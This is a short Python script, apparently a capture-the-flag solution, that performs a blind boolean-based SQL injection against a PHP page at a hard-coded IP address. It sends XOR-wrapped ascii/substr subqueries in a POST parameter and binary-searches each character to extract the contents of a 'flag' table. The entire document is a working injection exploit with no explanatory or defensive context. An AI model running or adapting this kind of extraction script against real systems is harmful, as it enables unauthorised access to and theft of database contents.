```python
url = "http://1.14.71.254:28684/index.php"
flag=""
payload = '1^(ascii(substr((select(flag)from(flag)),{},1))>{})^1%23'
for i in range(1,300):
    low = 32
    high = 130
    mid = (low + high) //2
    while (low < high):
        py = payload.format(i,mid)
        data = {"id" : py}
        r = requests.post(url,data)
        if 'NO!' in r.text:
            low = mid + 1
        else:
            high = mid
        mid = (low + high) //2
    flag += chr(mid)
    print(flag)
```

